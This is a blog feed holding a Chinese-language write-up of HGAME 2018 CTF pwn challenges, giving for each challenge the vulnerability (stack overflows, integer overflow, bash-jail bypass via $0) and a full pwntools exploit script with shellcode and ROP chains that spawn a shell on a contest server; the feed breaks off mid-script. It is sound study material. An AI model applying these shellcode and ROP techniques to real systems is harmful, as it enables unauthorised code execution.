<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p4nda | PWN &amp; security</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p4nda.top/"/>
  <updated>2018-03-03T14:17:31.576Z</updated>
  <id>http://p4nda.top/</id>
  
  <author>
    <name>P4NDA</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME 2018 PWN题记录</title>
    <link href="http://p4nda.top/2018/03/06/hgame/"/>
    <id>http://p4nda.top/2018/03/06/hgame/</id>
    <published>2018-03-05T16:00:00.000Z</published>
    <updated>2018-03-03T14:17:31.576Z</updated>
    
    <content type="html"><![CDATA[<p>HGAME 2018是由杭电的Vidar-Team举办的校内赛，历时一个月，记录一下其中的PWN题目。</p><h1 id="LEVEL-WEEK-1"><a href="#LEVEL-WEEK-1" class="headerlink" title="LEVEL - WEEK 1"></a>LEVEL - WEEK 1</h1><h2 id="guess-number"><a href="#guess-number" class="headerlink" title="guess_number"></a>guess_number</h2><p>题目流程很简单，首先使用/dev/urandom文件生成随机数，使用这个随机数作为rand()的种子，生成随机数，与用户输入的随机数进行比较，比较正确就会返回system(‘cat flag’)。</p><p><img src="/img/hgame2018/1_1_1.png" alt=""></p><p>这题存在一个明显的栈溢出漏洞，但是开启了canary保护。起初思路被urandom函数带偏了，以为是要用伪随机本地爆破rand()种子，再进行生成，还暗搓搓的感叹好难啊。。后来发现在guess_num函数中的栈溢出是可以利用的，这个随机数是以参数的方式传入的，在比较时寻址方式是用ebp+4来寻址的，也就是说利用栈溢出覆盖，完全可以将随机数覆盖成任意值。</p><p>解题的exp脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./guess_number'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'enter your guess:'</span>)</span><br><span class="line">a = <span class="string">"0\x00"</span></span><br><span class="line">a = a.ljust(<span class="number">0x128</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag-server"><a href="#flag-server" class="headerlink" title="flag_server"></a>flag_server</h2><p>题目的内容是一个登陆系统，当用户输入”admin”和随机数密码时可以将一个v9变量赋值为1，进一步可以执行system(‘cat flag’)</p><p><img src="/img/hgame2018/1_2_1.png" alt=""></p><p>其中，存在一个明显的整数负数溢出漏洞，当输入的长度是负数的时候，可以输入任意长的内容，在read_n函数中溢出，则可以覆盖到调用read_n函数的main函数栈中，进一步可以覆盖v9变量为任意值，导致控制逻辑流程。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./flag_server'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">'your username length: '</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'whats your username?'</span>)</span><br><span class="line">a = <span class="string">"admin"</span></span><br><span class="line">a = a.ljust(<span class="number">0x50</span>,<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> len(a)</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="zazahui"><a href="#zazahui" class="headerlink" title="zazahui"></a>zazahui</h2><p>一道贪玩蓝月梗的题目，在初始化函数中，分别将广告词和flag读到bss段中，在sub_8048698()函数中，一直让用户输入广告词。</p><p><img src="/img/hgame2018/1_3_1.png" alt=""></p><p>漏洞被故意留在sub_8048698函数中，根据栈中变量位置和输入长度可以很明显的发现可以覆盖s这个变量，当把变量覆盖为flag地址时，在puts(s)中就可以读出flag。</p><p>使用的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./zazahui'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x80486D5'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">a= <span class="string">'a'</span>*<span class="number">0xb0</span>+p32(<span class="number">0x804A060</span>)+p32(<span class="number">0x99</span>)</span><br><span class="line">p.sendline(a)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-2"><a href="#LEVEL-WEEK-2" class="headerlink" title="LEVEL - WEEK 2"></a>LEVEL - WEEK 2</h1><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>代码逻辑从题目名字中就可猜测出来，用户输入一串shellcode，程序来执行，仅仅限制了shellcode长度不超过24个字节。</p><p><img src="/img/hgame2018/2_1_1.png" alt=""></p><p>这样一来，pwntools的shellcraft.sh()就不能用了，只能手写一个shellcode拿到shell。其原理是执行int 80h，使得ebp指向’/bin/sh’,eax的值是0xb,ecx、edx置零就可以了。</p><p>解题使用的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ez_shellcode'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048663'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10004</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">push 0x732f2f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0xb</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">a = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> len(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-bash-jail"><a href="#ez-bash-jail" class="headerlink" title="ez_bash_jail"></a>ez_bash_jail</h2><p>此题给用户一个system(lineptr)的权利，但是限制了用户输入’abcfhgilnst<em>‘这些字母。这样一来如’cat flag’、’cat fl\</em>‘、’sh’、’/bin/sh’就都不能用了。</p><p><img src="/img/hgame2018/2_2_1.png" alt=""></p><p>题目给了hint，是研究一下system源码：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/system.c.html#do_system</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="number">116</span><span class="meta">#<span class="meta-keyword">ifdef</span> FORK</span></span><br><span class="line"><span class="number">117</span>  pid = FORK ();</span><br><span class="line"><span class="number">118</span><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="number">119</span>  pid = __fork ();</span><br><span class="line"><span class="number">120</span><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="number">121</span>  <span class="keyword">if</span> (pid == (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">122</span>    &#123;</span><br><span class="line"><span class="number">123</span>      <span class="comment">/* Child side.  */</span></span><br><span class="line"><span class="number">124</span>      <span class="keyword">const</span> <span class="keyword">char</span> *new_argv[<span class="number">4</span>];</span><br><span class="line"><span class="number">125</span>      new_argv[<span class="number">0</span>] = SHELL_NAME;</span><br><span class="line"><span class="number">126</span>      new_argv[<span class="number">1</span>] = <span class="string">"-c"</span>;</span><br><span class="line"><span class="number">127</span>      new_argv[<span class="number">2</span>] = line;</span><br><span class="line"><span class="number">128</span>      new_argv[<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">129</span></span><br><span class="line"><span class="number">130</span>      <span class="comment">/* Restore the signals.  */</span></span><br><span class="line"><span class="number">131</span>      (<span class="keyword">void</span>) __sigaction (SIGINT, &amp;intr, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">132</span>      (<span class="keyword">void</span>) __sigaction (SIGQUIT, &amp;quit, (struct sigaction *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">133</span>      (<span class="keyword">void</span>) __sigprocmask (SIG_SETMASK, &amp;omask, (<span class="keyword">sigset_t</span> *) <span class="literal">NULL</span>);</span><br><span class="line"><span class="number">134</span>      INIT_LOCK ();</span><br><span class="line"><span class="number">135</span></span><br><span class="line"><span class="number">136</span>      <span class="comment">/* Exec the shell.  */</span></span><br><span class="line"><span class="number">137</span>      (<span class="keyword">void</span>) __execve (SHELL_PATH, (<span class="keyword">char</span> *<span class="keyword">const</span> *) new_argv, __environ);</span><br><span class="line"><span class="number">138</span>      _exit (<span class="number">127</span>);</span><br><span class="line"><span class="number">139</span>    &#125;</span><br><span class="line"><span class="number">140</span>  <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; (<span class="keyword">pid_t</span>) <span class="number">0</span>)</span><br><span class="line"><span class="number">141</span>    <span class="comment">/* The fork failed.  */</span></span><br><span class="line"><span class="number">142</span>    status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">143</span>  <span class="keyword">else</span></span><br><span class="line"><span class="number">144</span>    <span class="comment">/* Parent side.  */</span></span><br><span class="line"><span class="number">145</span>    &#123;</span><br><span class="line"><span class="number">146</span>      <span class="comment">/* Note the system() is a cancellation point.  But since we call</span></span><br><span class="line"><span class="comment">147         waitpid() which itself is a cancellation point we do not</span></span><br><span class="line"><span class="comment">148         have to do anything here.  */</span></span><br><span class="line"><span class="number">149</span>      <span class="keyword">if</span> (TEMP_FAILURE_RETRY (__waitpid (pid, &amp;status, <span class="number">0</span>)) != pid)</span><br><span class="line"><span class="number">150</span>        status = <span class="number">-1</span>;</span><br><span class="line"><span class="number">151</span>    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到system的最后是执行了execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=lineptr 的。</p><p>再看一下execve的用法是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve()用来执行参数filename字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。</span><br></pre></td></tr></table></figure><p>就是可以重新执行一份新的代码。</p><p>再看下一个hint，学习一下shell的变量,正则等等?</p><p>题目中过滤了许多正常字符，但是\$符号没有被过滤，$是bash脚本中一个特殊的符号，可以定义变量，在搜索中发现bash中有几个特殊的变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$0就是该bash文件名</span><br><span class="line">$?是上一指令的返回值</span><br><span class="line">$*所有位置参数的内容：就是调用调用本bash shell的参数。</span><br><span class="line">$@基本上与上面相同。只不过是</span><br><span class="line">“$*”返回的是一个字符串，字符串中存在多外空格。</span><br><span class="line">“$@”返回多个字符串。</span><br><span class="line">&quot;$1&quot;，它代表一条记录中的第一列数据</span><br></pre></td></tr></table></figure><p>其中最特殊的是$0，它是执行execve程序时的filename路径。可以通过如下代码测试出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">#! /bin/sh</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line">echo $0</span><br><span class="line">echo &quot;=============&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char *newargv[] = &#123; &quot;xx&quot; &#125;;</span><br><span class="line">    char *newenviron[] = &#123; NULL &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    newargv[0] = argv[1];</span><br><span class="line"></span><br><span class="line">    execve(&quot;./a&quot;, newargv, newenviron);</span><br><span class="line">    perror(&quot;execve&quot;);   /* execve() only returns on error */</span><br><span class="line">    exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以发现在题目中执行system(lineptr)时，如果lineptr=’$0’的话，实际上执行的是execve(“/bin/sh”,new_argv,__environ)，其中new_argv[0]=’sh’,new_argv[1]=’-c’,new_argv[2]=’\$0’</p><p>而\$0就是’/bin/sh’，进一步就获得了shell。</p><p>题解的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./bash_jail'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10006</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'$0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="hacker-system-v1"><a href="#hacker-system-v1" class="headerlink" title="hacker_system_v1"></a>hacker_system_v1</h2><p>程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。</p><p><img src="/img/hgame2018/2_3_1.png" alt=""></p><p>通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048B1B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10005</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x34</span></span><br><span class="line">pr = <span class="number">0x08048455</span></span><br><span class="line">pppr = <span class="number">0x08048d49</span></span><br><span class="line">rop = padding + p32(<span class="number">0x804be00</span>)+p32(elf.symbols[<span class="string">'puts'</span>]) + p32(pr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804be00</span>) + p32(<span class="number">0x100</span>)+ p32(<span class="number">0x08048d4b</span>)+p32(<span class="number">0x804be00</span>)+p32(<span class="number">0x8048B1A</span>)<span class="comment"># p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p32(<span class="number">0x804bc00</span>)+ p32(libc.symbols[<span class="string">'system'</span>])+p32(<span class="number">0xdeadbeef</span>)+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x08048d4b : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048455 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08048d4a : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d49 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x0804843e : ret</span></span><br><span class="line"><span class="string">0x080487f0 : ret 0x458b</span></span><br><span class="line"><span class="string">0x0804819c : ret 0x8694</span></span><br><span class="line"><span class="string">0x080485ce : ret 0xeac1</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h2><p>这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz  <a href="http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int" target="_blank" rel="noopener">http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int</a> 80这样的指令。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ez_shellcode_ver2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10007</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a = shellcraft.sh()</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline((shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-3"><a href="#LEVEL-WEEK-3" class="headerlink" title="LEVEL - WEEK 3"></a>LEVEL - WEEK 3</h1><h2 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h2><p>这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。</p><p>因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400d74'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span 